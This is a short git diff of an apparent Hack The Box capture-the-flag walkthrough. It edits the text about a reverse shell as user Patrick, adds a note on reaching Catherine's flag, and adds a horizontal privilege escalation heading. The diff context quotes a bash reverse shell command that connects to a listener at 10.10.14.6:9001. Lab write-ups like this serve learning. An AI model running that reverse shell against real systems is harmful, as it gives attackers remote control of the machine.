@@ -325,17 +325,20 @@ This commands encodes *bash -i >& /dev/tcp/10.10.14.6/9001 0>&1* in base64, retu
 ![revsh]({{https://jsom1.github.io/}}/_images/htb_dz_revsh.png)
 </div>
 
-And we're finally in as Patrick! It's not shown in the picture, but every character I type in this reverse shell is doubled... It's very annoying, even though the commands work. This is because both terminals have stty echo, so we can fix this with the following commands:
+And we're finally in as Patrick! It's not shown in the picture, but every character I type in this reverse shell is doubled... It's very annoying, even though the commands work. An explanation I found was that both terminals have stty echo, so we can fix this with the following commands:
 
 ````
 ctrl+Z
 stty -echo
 fg
 ````
+It appears the flag is on Catherine's Desktop, and we can't read it as Patrick... We have to find a way to change users.
+
+## 3. Horizontal privilege escalation
+{:style="color:DarkRed; font-size: 170%;"}
 
 
-
-## 3. Vertical privilege escalation
+## 4. Vertical privilege escalation
 {:style="color:DarkRed; font-size: 170%;"}
 
 
